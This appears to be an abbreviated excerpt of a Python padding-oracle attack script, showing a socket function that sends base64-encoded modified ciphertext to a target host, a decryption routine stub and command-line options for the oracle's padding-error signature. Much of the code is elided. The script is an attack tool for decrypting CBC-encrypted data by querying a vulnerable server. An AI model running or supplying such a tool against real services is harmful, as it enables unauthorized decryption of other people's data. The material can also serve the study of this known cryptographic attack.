...
def call_oracle(up_cipher):
    ...
    s.connect((HOST, PORT))
    up_cipher = ''.join([chr(int('0x'+up_cipher[x:x+2], 16)) for x in range(0, len(up_cipher), 2)])
    s.send(base64.b64encode(up_cipher)+'\n')
    return s, s.recv(200)
...
def run(cipher,size_block,host,error):
    cipher       = cipher.upper()
    found        = False
    valide_value = []
    result       = []
...
if __name__ == '__main__':                           
    ...
    parser.add_argument('--error',                      required=False,              help='Error that oracle give us example: 404,500,200 OR in the dom example: "<h2>Padding Error<h2>"')
    ...
    for char in cipher:
        ...
        if len(hx) != 2:
            hx = hx.rjust(2, '0')
        cipher_arr.append(hx)
    cipher = ''.join(cipher_arr)
    run(cipher, args.length_block_cipher, args.host, args.error)
